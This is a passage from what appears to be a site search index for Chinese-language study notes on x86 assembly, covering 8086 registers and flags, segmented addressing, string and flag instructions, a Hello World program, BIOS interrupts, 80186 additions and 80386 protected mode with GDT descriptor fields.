\u4f4d\uff0cCPU \u662f\u5426\u8fdb\u5165\u5355\u6b65\u5de5\u4f5c\u72b6\u6001 sf\uff1asign flag \u7b26\u53f7\u6807\u5fd7\uff0c\u7b2c 7 \u4f4d\uff0c\u8fd0\u7b97\u7ed3\u679c\u7684\u7b26\u53f7\uff081 \u8868\u793a\u8d1f\uff09 zf\uff1azero flag \u96f6\u6807\u5fd7\uff0c\u7b2c 6 \u4f4d\uff0c\u8fd0\u7b97\u7ed3\u679c\u662f\u5426\u4e3a 0 af\uff1aauxiliary carry flag \u8f85\u52a9\u8fdb\u4f4d\u6807\u5fd7\uff0c\u7b2c 4 \u4f4d\uff0c\u8bb0\u5f55\u8fd0\u7b97\u65f6\u7b2c\u4e09\u4f4d\u662f\u5426\u5411\u5de6\u4fa7\u4ea7\u751f\u8fdb\u501f\u4f4d pf\uff1aparity flag \u5947\u5076\u6807\u5fd7\uff0c\u7b2c 2 \u4f4d\uff0c\u7ed3\u679c\u64cd\u4f5c\u6570\u4e2d\u4f4e 8 \u4f4d 1 \u7684\u4e2a\u6570\u662f\u5426\u4e3a\u5076\u6570 cf\uff1acarry flag \u8fdb\u4f4d\u6807\u5fd7\uff0c\u7b2c 0 \u4f4d\uff0c\u8fd0\u7b97\u65f6\u6700\u9ad8\u4f4d\u662f\u5426\u5411\u5de6\u4fa7\u6709\u8fdb\u501f\u4f4d 80386 32 \u4f4d\u5bc4\u5b58\u5668\u4e00\u5171\u6709 16 \u4e2a \u901a\u7528\u5bc4\u5b58\u5668 eax ebx ecx edx\uff0c\u53ef\u4ee5\u4f7f\u7528\u4f8b\u5982 ax \u8868\u793a\u4f4e 16 \u4f4d\uff0cah al \u5206\u522b\u8868\u793a\u4f4e 16 \u4f4d\u4e2d\u7684\u9ad8\u4f4e 8 \u4f4d esi edi\uff0c\u4f4e 16 \u4f4d\u4e3a si di esp ebp\uff0c\u4f4e 16 \u4f4d\u4e3a sp bp \u6bb5\u5bc4\u5b58\u5668\uff1acs ss ds es fs gs\uff08\u591a\u4e86\u4e24\u4e2a\u9644\u52a0\u6570\u636e\u6bb5\u5bc4\u5b58\u5668\uff09 \u63a7\u5236\u5bc4\u5b58\u5668\uff1aeip eflags","title":"\u5185\u90e8\u5bc4\u5b58\u5668"},{"location":"cs/pl/asm/#8086","text":"\u53ef\u8bbf\u95ee\u7684\u5185\u5b58\u4e00\u5171\u6709 1MB\uff0c\u5341\u516d\u8fdb\u5236\u8868\u793a\u4e3a 00000h~FFFFFh\uff0c\u8fd9\u6837\u7528 20 \u4f4d\u8868\u793a\u7684\u5730\u5740\u79f0\u4e3a\u7269\u7406\u5730\u5740 \u5bfb\u5740\u65f6\u4f7f\u7528\u7684\u662f \u6bb5\u5730\u5740:\u504f\u79fb\u5730\u5740 \u5f62\u5f0f\u7684\u903b\u8f91\u5730\u5740\uff0c\u5bf9\u5e94\u7684\u7269\u7406\u5730\u5740\u4e3a \u6bb5\u5730\u5740*16+\u504f\u79fb\u5730\u5740\uff0c\u6c47\u7f16\u91cc\u5199\u6210 \u6bb5\u5730\u5740:[\u504f\u79fb\u5730\u5740]\u3002\u540c\u6837\u4e5f\u5bb9\u6613\u770b\u51fa\u4e00\u4e2a\u5b58\u50a8\u5355\u5143\u5bf9\u5e94\u7684\u903b\u8f91\u5730\u5740\u8868\u793a\u5e76\u4e0d\u552f\u4e00","title":"8086 \u5185\u5b58\u7ec4\u7ec7"},{"location":"cs/pl/asm/#_4","text":"\u6c47\u7f16\u6307\u4ee4\u4e00\u822c\u7531\u64cd\u4f5c\u7801\uff08opcode\uff09\u548c\u64cd\u4f5c\u6570\uff08operand\uff09\u6784\u6210\uff0c\u4efb\u4f55\u6307\u4ee4\u90fd\u6709\u64cd\u4f5c\u7801\uff0c\u64cd\u4f5c\u6570\u7684\u4e2a\u6570\u4e0d\u4e00\u5b9a","title":"\u6307\u4ee4\u7cfb\u7edf\u4e0e\u5bfb\u5740\u65b9\u5f0f"},{"location":"cs/pl/asm/#8086_1","text":"\u5982\u679c\u6307\u4ee4\u4e2d\u6ca1\u6709\u6807\u5fd7\u4f4d\u8868\u683c\uff0c\u5219\u8be5\u6307\u4ee4\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d\u3002\u53f3\u659c\u7ebf\u8868\u793a\u8be5\u6807\u5fd7\u4f4d\u7531\u7ed3\u679c\u51b3\u5b9a\uff0c\u5168\u90e8\u586b\u5145\u4e3a\u6839\u636e\u7279\u6b8a\u610f\u4e49\u8bbe\u5b9a\uff08\u6ce8\u610f\u4e2d\u4f1a\u5177\u4f53\u8bf4\uff09\uff0c\u6253\u53c9\u4e3a undefined\uff08\u4e00\u822c\u4e0d\u53d8\uff09","title":"8086 \u6c47\u7f16\u6307\u4ee4"},{"location":"cs/pl/asm/#_6","text":"","title":"\u6570\u636e\u4f20\u9001\u6307\u4ee4"},{"location":"cs/pl/asm/#_11","text":"","title":"\u8f6c\u6362\u6307\u4ee4"},{"location":"cs/pl/asm/#_13","text":"","title":"\u7b97\u6570\u6307\u4ee4"},{"location":"cs/pl/asm/#_20","text":"BCD \u7801\u662f\u4f7f\u7528\u4e8c\u8fdb\u5236\u7f16\u7801\u5341\u8fdb\u5236\u6570\uff0c\u53ef\u4ee5\u5206\u4e3a\u538b\u7f29 BCD \u7801\u548c\u975e\u538b\u7f29 BCD \u7801","title":"\u5341\u8fdb\u5236\u8c03\u6574\u6307\u4ee4"},{"location":"cs/pl/asm/#_21","text":"\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u5206\u4e3a movs \u5b57\u7b26\u4e32\u4f20\u9001\u3001cmps \u5b57\u7b26\u4e32\u6bd4\u8f83\u3001scas \u5b57\u7b26\u4e32\u626b\u63cf\u3001stos \u5b58\u5165\u5b57\u7b26\u4e32\u3001lods \u4ece\u5b57\u7b26\u4e32\u53d6\u4e94\u79cd\uff0c\u5b83\u4eec\u90fd\u53ef\u4ee5\u63a5\u4e00\u4e2a\u6307\u4ee4\u524d\u7f00\u3002\u5982\u679c\u4e0d\u63a5\u524d\u7f00\uff0c\u5219\u53ea\u6267\u884c\u4e00\u6b21\uff0c\u5982\u679c\u63a5\u524d\u7f00\uff0c\u5219\u91cd\u590d\u6267\u884c\u3002lods \u6307\u4ee4\u4e0d\u5e38\u7528\u524d\u7f00 \u524d\u7f00 rep \u4f5c\u7528 \uff1a\u628a\u540e\u9762\u7684\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u91cd\u590d cx \u6b21 \u6ce8\u610f \uff1acx \u9700\u8981\u63d0\u524d\u8bbe\u7f6e\uff0c\u4e00\u822c\u4e0d\u63a5 cmps scas \u524d\u7f00 repe / repz \u4f5c\u7528 \uff1a\u6700\u591a\u91cd\u590d cx \u6b21\uff0c\u4e14\u4ec5\u5f53\u6bd4\u8f83\u76f8\u7b49\u65f6\u7ee7\u7eed\u91cd\u590d \u6ce8\u610f \uff1acx \u9700\u8981\u63d0\u524d\u8bbe\u7f6e\uff0c\u4e0d\u80fd\u7528\u5728 movs stos \u4e0a \u524d\u7f00 repne / repnz \u4f5c\u7528 \uff1a\u6700\u591a\u91cd\u590d cx \u6b21\uff0c\u4e14\u4ec5\u5f53\u6bd4\u8f83\u4e0d\u76f8\u7b49\u65f6\u7ee7\u7eed\u91cd\u590d \u6ce8\u610f \uff1acx \u9700\u8981\u63d0\u524d\u8bbe\u7f6e\uff0c\u4e0d\u80fd\u7528\u5728 movs stos \u4e0a","title":"\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4"},{"location":"cs/pl/asm/#_27","text":"","title":"\u63a7\u5236\u8f6c\u79fb\u6307\u4ee4"},{"location":"cs/pl/asm/#_33","text":"clc \u6307\u4ee4\u683c\u5f0f \uff1aclc \u6307\u4ee4\u4f5c\u7528 \uff1a\u6e05\u7a7a\u8fdb\u4f4d\u4f4d\uff0c\u5373 cf = 0 OF DF IF TF SF ZF AF PF CF stc \u6307\u4ee4\u683c\u5f0f \uff1astc \u6307\u4ee4\u4f5c\u7528 \uff1a\u8bbe\u7f6e\u8fdb\u4f4d\u4f4d\uff0c\u5373 cf = 1 OF DF IF TF SF ZF AF PF CF cmc \u6307\u4ee4\u683c\u5f0f \uff1acmc \u6307\u4ee4\u4f5c\u7528 \uff1a\u8fdb\u4f4d\u4f4d\u6c42\u53cd\uff0c\u5373 cf = ~cf OF DF IF TF SF ZF AF PF CF cld \u6307\u4ee4\u683c\u5f0f \uff1acld \u6307\u4ee4\u4f5c\u7528 \uff1a\u6e05\u7a7a\u65b9\u5411\u4f4d\uff0c\u5373 df = 0\uff08\u6b63\u65b9\u5411\uff09 OF DF IF TF SF ZF AF PF CF std \u6307\u4ee4\u683c\u5f0f \uff1astd \u6307\u4ee4\u4f5c\u7528 \uff1a\u8bbe\u7f6e\u65b9\u5411\u4f4d\uff0c\u5373 df = 1\uff08\u8d1f\u65b9\u5411\uff09 OF DF IF TF SF ZF AF PF CF cli \u6307\u4ee4\u683c\u5f0f \uff1acli \u6307\u4ee4\u4f5c\u7528 \uff1a\u7981\u6b62\u4e2d\u65ad\uff0c\u5373 if = 0 OF DF IF TF SF ZF AF PF CF sti \u6307\u4ee4\u683c\u5f0f \uff1asti \u6307\u4ee4\u4f5c\u7528 \uff1a\u5141\u8bb8\u4e2d\u65ad\uff0c\u5373 if = 1 OF DF IF TF SF ZF AF PF CF nop \u6307\u4ee4\u683c\u5f0f \uff1anop \u6307\u4ee4\u4f5c\u7528 \uff1a\u65e0\u64cd\u4f5c\uff0c\u673a\u5668\u7801 90h\uff0c\u5360\u7528\u4e00\u4e2a\u5b57\u8282\u7a7a\u95f4\uff0c\u4e14\u6d88\u8017\u8fd0\u884c\u65f6\u95f4\uff0c\u4f46\u4e0d\u8fdb\u884c\u64cd\u4f5c hlt \u6307\u4ee4\u683c\u5f0f \uff1ahlt \u6307\u4ee4\u4f5c\u7528 \uff1a\u505c\u6b62\u5904\u7406\u5668\u5de5\u4f5c\uff0c\u76f4\u5230\u7cfb\u7edf\u590d\u4f4d\u6216\u53d1\u9001\u975e\u5c4f\u853d\u4e2d\u65ad\u6216\u5916\u90e8\u4e2d\u65ad","title":"\u6742\u7c7b\u6307\u4ee4"},{"location":"cs/pl/asm/#8086_2","text":"","title":"8086 \u6c47\u7f16\u7a0b\u5e8f\u7f16\u5199"},{"location":"cs/pl/asm/#_34","text":"data segment ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5 hey db ' Hello , world ! ' , 0 Dh , 0 Ah , ' $ ' ; \u4f2a\u6307\u4ee4\u8bed\u53e5 data ends ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5 code segment ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5 assume cs : code , ds : data ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5 main: ; \u6307\u4ee4\u8bed\u53e5 mov ax , data ; ... mov ds , ax mov ah , 9 mov dx , offset hey int 21 h mov ah , 4 Ch int 21 h code ends ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5 end main ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5","title":"\u6c47\u7f16\u7a0b\u5e8f\u57fa\u672c\u7ed3\u6784"},{"location":"cs/pl/asm/#_35","text":"","title":"\u6bb5\u7684\u5b9a\u4e49\u3001\u5047\u8bbe\u4e0e\u5f15\u7528"},{"location":"cs/pl/asm/#_39","text":"","title":"\u7a0b\u5e8f\u7684\u7ed3\u675f"},{"location":"cs/pl/asm/#_43","text":"\u7a7a\u767d\u4e0d\u654f\u611f \u5e38\u6570\u53ef\u4ee5\u4f7f\u7528\u6574\u578b\u5e38\u6570\u3001\u5b57\u7b26\u5e38\u6570\u3001\u5b57\u7b26\u4e32\u5e38\u6570\uff08\u62c6\u4e3a\u5b57\u7b26\uff09 \u53ef\u4ee5\u4f7f\u7528\u5e38\u6570\u8868\u8fbe\u5f0f\u4f5c\u4e3a\u5e38\u6570\uff0c\u6709 + - * / mod shl shr not and or xor seg offset\uff0c\u5e38\u6570\u8868\u8fbe\u5f0f\u4e2d\u4e0d\u80fd\u51fa\u73b0\u5bc4\u5b58\u5668\u7b49\uff0c\u53ea\u80fd\u662f\u5e38\u6570 \u53ef\u4ee5\u4f7f\u7528 eql \u548c = \u5b9a\u4e49\u7b26\u53f7\u5e38\u6570 = \u7684\u53f3\u4fa7\u53ea\u80fd\u662f\u6570\u503c\u7c7b\u578b\u6216\u5b57\u7b26\u7c7b\u578b\u7684\u5e38\u6570\u6216\u5e38\u6570\u8868\u8fbe\u5f0f\uff0c\u53ef\u4ee5\u5bf9\u540c\u4e00\u7b26\u53f7\u91cd\u65b0\u5b9a\u4e49 eql \u7684\u53f3\u4fa7\u8fd8\u53ef\u4ee5\u662f\u5b57\u7b26\u4e32\u3001\u6c47\u7f16\u8bed\u53e5\uff08 dosint eql < int 21 h > \uff09\uff0c\u4f46\u4e0d\u80fd\u5bf9\u540c\u4e00\u7b26\u53f7\u91cd\u65b0\u5b9a\u4e49 \u53d8\u91cf\u540d\u548c\u6807\u53f7\u540d\u7684\u547d\u540d\uff1a\u53ef\u4ee5\u662f 52 \u4e2a\u5927\u5c0f\u5199\u5b57\u6bcd\u300110 \u4e2a\u6570\u5b57\u3001\u4ee5\u53ca @$?_\uff0c\u6570\u5b57\u4e0d\u80fd\u5f00\u5934\uff0c$ \u4e0e ? \u4e0d\u80fd\u5355\u72ec\u4f7f\u7528\uff0c\u4e00\u822c\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff08\u7f16\u8bd1\u65f6\u52a0\u4e0a /ml \u533a\u5206\u5927\u5c0f\u5199\uff09 \u6807\u53f7\u5b9a\u4e49 \u6807\u53f7\u540d: \u5373\u53ef \u6216\u8005 \u6807\u53f7\u540d label near | far | byte | word | dword near far \u6807\u8bc6\u8fd1\u6807\u53f7\u548c\u8fdc\u6807\u53f7 byte word dword \u6807\u8bc6\u6807\u53f7\u4e3a\u53d8\u91cf \u53d8\u91cf\u7684\u5f15\u7528\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u53d8\u91cf\u540d\u6216\u8005 [\u53d8\u91cf\u540d] \u53ef\u4ee5\u4f7f\u7528 \u53d8\u91cf\u540d[\u504f\u79fb] \u6765\u7c7b\u4f3c\u6570\u7ec4\u5f15\u7528\u503c\uff0c\u4f46\u504f\u79fb\u8bb0\u5f97\u504f\u79fb 1 \u5c31\u662f\u52a0\u4e00\u4e2a\u5b57\u8282\uff0c\u800c\u4e0d\u662f\u4e0b\u4e00\u4e2a\u5143\u7d20","title":"\u6c47\u7f16\u7a0b\u5e8f\u8bed\u53e5"},{"location":"cs/pl/asm/#_44","text":"\u5b50\u7a0b\u5e8f\u53c8\u79f0\u8fc7\u7a0b\uff0c\u5373\u7c7b\u4f3c\u9ad8\u7ea7\u8bed\u8a00\u4e2d\u7684\u51fd\u6570\uff0c\u901a\u8fc7 call \u8c03\u7528 ret \u8fd4\u56de\uff0c\u53ef\u4ee5\u8fd1\u8c03\u7528\u6216\u8fdc\u8c03\u7528\u3002\u8fc7\u7a0b\u7684\u5b9a\u4e49\uff1a < name > proc < attribute > ... < name > endp \u5176\u4e2d attribute \u4e3a near \u6216 far\uff0cnear \u5b9a\u4e49\u8fd1\u8fc7\u7a0b\u4f9b\u8fd1\u8c03\u7528\uff0c\u53ea\u80fd\u5728\u540c\u4e00\u4ee3\u7801\u6bb5\u5185\u8d77\u4f5c\u7528\uff1bfar \u5b9a\u4e49\u8fdc\u8fc7\u7a0b\u4f9b\u8fdc\u8c03\u7528\uff0c\u53ef\u4ee5\u5728\u540c\u4e00\u4ee3\u7801\u6bb5\u6216\u4e0d\u540c\u4ee3\u7801\u6bb5\u5185\u4f7f\u7528 \u5982\u679c\u8fbe\u5230\u51fd\u6570\u7684\u6548\u679c\u4e5f\u53ef\u4ee5\u4e0d\u5b9a\u4e49\u8fc7\u7a0b\uff0c\u53ea\u5b9a\u4e49\u4e00\u4e2a\u6807\u53f7\uff0c\u7136\u540e\u4f7f\u7528 ret / retn \u8fd4\u56de \u8fc7\u7a0b\u4e2d\u8981\u4fdd\u62a4\u67d0\u4e9b\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u6b64\u65f6\u8981\u5728\u8fc7\u7a0b\u5f00\u5934 push \u5165\u5806\u6808\uff0c\u7ed3\u5c3e\u4ece\u5806\u6808 pop \u56de\u6765","title":"\u5b50\u7a0b\u5e8f\u8bbe\u8ba1"},{"location":"cs/pl/asm/#_47","text":"\u4e2d\u65ad\u662f\u5728 CPU \u8fd0\u884c\u671f\u95f4\u9047\u5230\u67d0\u4e9b\u60c5\u51b5\u6682\u65f6\u4e2d\u6b62\u5f53\u524d\u7a0b\u5e8f\uff0c\u53bb\u6267\u884c\u53e6\u4e00\u6bb5\u7279\u6b8a\u5904\u7406\u7a0b\u5e8f\u7684\u8fc7\u7a0b\u3002\u5206\u4e3a\u5185\u90e8\u4e2d\u65ad\u548c\u5916\u90e8\u4e2d\u65ad\uff0c\u5185\u90e8\u4e2d\u65ad\u4e00\u822c\u5c31\u662f\u7531 int \u6307\u4ee4\u6216\u8005 CPU \u7684\u67d0\u4e9b\u9519\u8bef\u6216\u8005\u8c03\u8bd5\u670d\u52a1\u5f15\u8d77\u7684\uff0c\u5916\u90e8\u4e2d\u65ad\u4e00\u822c\u5c31\u662f\u65f6\u949f\u4e2d\u65ad\u3001\u952e\u76d8\u4e2d\u65ad\u7b49 \u4e2d\u65ad\u8c03\u7528\u4e0e\u8fd4\u56de\u5728\u524d\u9762\u6307\u4ee4\u90e8\u5206\u6709\u4ecb\u7ecd","title":"\u4e2d\u65ad"},{"location":"cs/pl/asm/#bios","text":"int 10h \u7c7b\u578b \uff1a\u89c6\u9891\u4e2d\u65ad \u5b50\u529f\u80fd \uff1aah = 00h \u53f7\u529f\u80fd\u5207\u6362\u663e\u793a\u6a21\u5f0f al = 03h \u8868\u793a 80*25 \u6587\u672c\u6a21\u5f0f al = 13h \u8868\u793a 320*200*256 \u56fe\u5f62\u6a21\u5f0f","title":"BIOS \u4e2d\u65ad"},{"location":"cs/pl/asm/#80x86","text":"","title":"80x86 \u589e\u52a0\u6307\u4ee4"},{"location":"cs/pl/asm/#80186","text":"insb 80186 \u6307\u4ee4\u683c\u5f0f \uff1ainsb / rep insb \u6307\u4ee4\u4f5c\u7528 \uff1a(input from port to string) \u7b49\u4ef7\u4e8e in al, dx; mov es:[di], al \u5e76\u79fb\u52a8 di \u6ce8\u610f \uff1adi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a insw 80186 \u6307\u4ee4\u683c\u5f0f \uff1ainsw / rep insw \u6307\u4ee4\u4f5c\u7528 \uff1a(input from port to string) \u7b49\u4ef7\u4e8e in ax, dx; mov es:[di], ax \u5e76\u79fb\u52a8 di \u6ce8\u610f \uff1adi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a outsb 80186 \u6307\u4ee4\u683c\u5f0f \uff1aoutsb / rep outsb \u6307\u4ee4\u4f5c\u7528 \uff1a(output string to port) \u7b49\u4ef7\u4e8e mov al, ds:[si]; out al, dx \u5e76\u79fb\u52a8 si \u6ce8\u610f \uff1asi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a outsw 80186 \u6307\u4ee4\u683c\u5f0f \uff1aoutsw / rep outsw \u6307\u4ee4\u4f5c\u7528 \uff1a(output string to port) \u7b49\u4ef7\u4e8e mov ax, ds:[si]; out ax, dx \u5e76\u79fb\u52a8 si \u6ce8\u610f \uff1asi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 cld std \u8bbe\u7f6e\uff0cdf=0 \u5219 di \u79fb\u5411\u4e0b\u4e00\u4e2a\u5b57\uff0c\u5426\u5219\u79fb\u5411\u4e0a\u4e00\u4e2a pusha 80186 \u6307\u4ee4\u683c\u5f0f \uff1apusha \u6307\u4ee4\u4f5c\u7528 \uff1apush \u6240\u6709\u901a\u7528\u7528\u9014\u5bc4\u5b58\u5668\uff0c\u987a\u5e8f\u4ece\u5148\u5230\u540e\u4e3a ax cx dx bx sp bp si di popa 80186 \u6307\u4ee4\u683c\u5f0f \uff1apopa \u6307\u4ee4\u4f5c\u7528 \uff1apop \u5230\u6240\u6709\u901a\u7528\u7528\u9014\u5bc4\u5b58\u5668\uff0c\u987a\u5e8f\u4ece\u5148\u5230\u540e\u4e3a di si bp sp bx dx cx ax \u7acb\u5373\u6570\u8bed\u6cd5\u6269\u5c55 80186 push \u53ef\u4ee5\u76f4\u63a5\u63a5\u7acb\u5373\u6570 imul shl shr sal sar rol ror rcl rcr \u7b2c\u4e8c\u4e2a\u64cd\u4f5c\u6570\u53ef\u4ee5\u662f\u7acb\u5373\u6570","title":"80186"},{"location":"cs/pl/asm/#80286","text":"80286 \u589e\u52a0\u4e86\u4fdd\u62a4\u6a21\u5f0f\u53ca\u76f8\u5173\u6307\u4ee4\uff0c\u4e0d\u5199\u5728\u8fd9\u91cc\u4e86","title":"80286"},{"location":"cs/pl/asm/#80386","text":"80386\uff08\u5373 i386\uff09\u5347\u7ea7\u5230\u4e86 32 \u4f4d\u67b6\u6784\uff0c\u5bc4\u5b58\u5668\u5747\u53d8\u4e3a 32 \u4f4d\uff08\u4ee5 e \u5f00\u5934\uff09\uff0c\u589e\u52a0\u4e86 fs gs \u4e24\u4e2a\u9644\u52a0\u6570\u636e\u6bb5\u5bc4\u5b58\u5668\u3002\u4e00\u4e9b\u6307\u4ee4\u4ece 8086 \u81ea\u7136\u6269\u5c55\u652f\u6301 32 \u4f4d\uff0c\u4e0d\u5728\u6b64\u8d58\u8ff0","title":"80386"},{"location":"cs/pl/asm/#80386_1","text":"","title":"80386 \u4fdd\u62a4\u6a21\u5f0f\u539f\u7406"},{"location":"cs/pl/asm/#_59","text":"\u5b9e\u6a21\u5f0f\uff08real mode\uff09 \u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u5747\u4e3a 16 \u4f4d \u6bb5\u5730\u5740*10h + \u504f\u79fb\u5730\u5740 = \u7269\u7406\u5730\u5740 \u6bcf\u4e2a\u6bb5\u7684\u6700\u5927\u957f\u5ea6 = 10000h \u5b57\u8282 \u6bcf\u4e2a\u6bb5\u540c\u65f6\u5177\u6709 Read Write eXecute \u5c5e\u6027 \u64cd\u4f5c\u7cfb\u7edf\u548c\u7528\u6237\u4ee3\u7801\u6ca1\u6709\u6743\u9650\u4e0a\u7684\u5dee\u522b\uff0c\u90fd\u662f ring0\uff08\u6700\u9ad8\u6743\u9650\uff09 \u4fdd\u62a4\u6a21\u5f0f\uff08protected mode\uff09 \u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u53ef\u4ee5\u662f 16\u4f4d:16\u4f4d \u4e5f\u53ef\u4ee5\u662f 16\u4f4d:32\u4f4d gdt[\u6bb5\u5730\u5740].base_addr + \u504f\u79fb\u5730\u5740 = \u7269\u7406\u5730\u5740 \u6bcf\u4e2a\u6bb5\u7684\u6700\u5927\u957f\u5ea6 = 4G \u5b57\u8282 \u6570\u636e\u6bb5\u7684\u5c5e\u6027\uff1a\u53ea\u8bfb\u3001\u8bfb\u5199 \u4ee3\u7801\u6bb5\u7684\u5c5e\u6027\uff1a\u53ea\u6267\u884c\u4e0d\u53ef\u8bfb\u3001\u53ef\u6267\u884c\u53ef\u8bfb \u64cd\u4f5c\u7cfb\u7edf\u548c\u7528\u6237\u4ee3\u7801\u6709\u6743\u9650\u4e0a\u7684\u5dee\u522b\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4e3a ring0\uff0c\u7528\u6237\u4ee3\u7801\u4e3a ring3 \u963b\u6b62 ring3 \u7684\u4ee3\u7801\u8bbf\u95ee ring0 \u7684\u6570\u636e\uff1a mov ax , \u6bb5\u5730\u5740 mov ds , ax ; \u8fd9\u4e00\u6b65\u4f1a\u88ab\u9650\u5236 mov ebx , \u504f\u79fb\u5730\u5740 mov al , ds :[ ebx ] \u5f53\u6bb5\u5bc4\u5b58\u5668\u88ab\u8d4b\u503c\u7684\u65f6\u5019\uff0cCPU \u4f1a\u8fdb\u884c\u6743\u9650\u68c0\u67e5\uff0c\u628a\u5f53\u524d cs \u7684\u4f4e 2 \u4f4d\u548c\u6bb5\u5730\u5740\u5bf9\u5e94\u7684\u63cf\u8ff0\u7b26\u6240\u5305\u542b\u7684 DPL \u8fdb\u884c\u6bd4\u8f83\u5982\u679c \u201ccs.cpl <= \u6bb5\u5730\u5740->\u63cf\u8ff0\u7b26.DPL\u201d \u5219\u5141\u8bb8\u8bbf\u95ee\uff0c\u5426\u5219\u4ea7\u751f General Protection Fault CPL\uff08current privilege level\uff09\u5373 cs \u7684\u4f4e 2 \u4f4d\uff0c\u8868\u793a\u5f53\u524d\u7a0b\u5e8f\u7684\u6743\u9650\uff0cDPL\uff08descriptor privilege level\uff09\u8868\u793a\u6bb5\u5730\u5740\u5bf9\u5e94\u63cf\u8ff0\u7b26\u7684\u6743\u9650\u3002\u610f\u4e49\u5373\u662f ring?\uff0c\u6570\u5b57\u8d8a\u5c0f\u6743\u9650\u8d8a\u5927","title":"\u5b9e\u6a21\u5f0f\u4e0e\u4fdd\u62a4\u6a21\u5f0f\u7684\u533a\u522b"},{"location":"cs/pl/asm/#_60","text":"gdt\uff08global descriptor table\uff09\u5168\u5c40\u63cf\u8ff0\u7b26\u8868\uff0c\u662f\u4e00\u4e2a\u7ed3\u6784\u6570\u7ec4\uff0c\u6bcf\u4e2a\u5143\u7d20\u5747\u4e3a 8 \u5b57\u8282\u3002 \u7a0b\u5e8f\u4e2d\u7684\u6bb5\u5730\u5740\u5b9e\u9645\u4e0a\u53eb selector\uff0cselector \u5bf9\u5e94\u7684\u63cf\u8ff0\u7b26\u4e3a gdt+(selector&0FFF8h) \u5904\u7684 8 \u5b57\u8282\uff08\u5373\u4e22\u6389 selector \u7684\u4f4e 3 \u4f4d\uff09 gdt+00h gdt+08h +---+---+-base_addr--+ | | | | -- -- -- -- gdt+10h FF, FF, 00, 80, 0B, F3, 0F, 00 ; \u6574\u4f53 8 \u5b57\u8282\u662f\u6bb5\u5730\u5740 10h \u7684\u63cf\u8ff0\u7b26\uff08descriptor\uff09 ~~ ~~ == ^~ +---+---------------|---|+ | | +-- Granularity = bit 7 | +-- DPL = bit 6, 5 = 11 +-- limit || || 1111 0011 <- 0F |--| | || | | | |+-- Accessed | | | +-- bit 1 | | +-- bit 3 | +-- S +-- Present = bit 7 gdt+18h \u7b2c 5 \u4e2a\u5b57\u8282\u7684\u7b2c 6\u30015 \u4e2a bit \u4e3a DPL \u4f8b\u4e0a\u9762 10h \u6bb5\u7684 DPL \u4e3a 11b \u5373 3\uff08F3 -> 1 11 1 0011\uff09 \u7b2c 2\u30013\u30014\u30017 \u4e2a\u5b57\u8282\u4e3a\u6bb5\u8d77\u59cb\u5730\u5740 base_addr\uff0c\u5c0f\u7aef\u5e8f \u4f8b\u4e0a\u9762 10h \u6bb5\u7684\u6bb5\u8d77\u59cb\u5730\u5740\u4e3a 000B8000h \u7b2c 0\u30011 \u4e2a\u5b57\u8282\u548c\u7b2c 6 \u4e2a\u5b57\u8282\u7684\u540e\u534a\u4e2a\u5b57\u8282\u4e3a\u6700\u5927\u504f\u79fb\u5730\u5740 limit\uff0c\u5c0f\u7aef\u5e8f \u4f8b\u4e0a\u9762 10h \u6bb5\u7684\u6700\u5927\u504f\u79fb\u5730\u5740\u4e3a 0FFFFFh\uff0c\u6700\u5c0f\u504f\u79fb\u5730\u5740\u4e3a 0\uff0c\u6240\u4ee5\u6bb5\u957f\u5ea6\u4e3a 100000h \u5373 1M \u7b2c 6 \u4e2a\u5b57\u8282\u7684\u7b2c 7 \u4e2a bit \u4e3a\u7c92\u5ea6 Granularity\uff0c\u5f53\u8be5\u4f4d\u4e3a 1 \u65f6\uff0climit \u7684\u5355\u4f4d\u53d8\u6210 page\uff08\u9875\uff0c\u4e00\u9875\u4e3a 4k=1000h \u5b57\u8282\uff09 \u4f8b\u5982\u5982\u679c limit \u4e3a FFFFF\uff0cG \u4e3a 1\uff0c\u5219\u6700\u5927\u504f\u79fb\u5730\u5740\u53d8\u4e3a FFFFFFFF\uff08\u6700\u540e\u4e00\u9875\u7684\u5730\u5740\u4e3a [FFFFF000, FFFFFFFF]\uff09 \u7b2c 5 \u4e2a\u5b57\u8282\u7684\u5176\u5b83 bit \u7b2c 7 bit \u4e3a Present\uff0c\u8868\u793a\u8be5\u6bb5\u662f\u5426\u5b58\u5728 \u7b2c 4 bit \u4e3a S\uff0cS = 1 \u8868\u793a\u662f\u6570\u636e\u6bb5\u6216\u4ee3\u7801\u6bb5\uff0c0 \u5219\u662f\u7cfb\u7edf\u63cf\u8ff0\u7b26\uff08\u5305\u62ec\u4e0b\u9762\u7684 call gate\uff09 \u7b2c 3 bit \u4e3a 0 \u8868\u793a\u662f\u6570\u636e\u6bb5\uff0c1 \u8868\u793a\u662f\u4ee3\u7801\u6bb5 \u7b2c 1 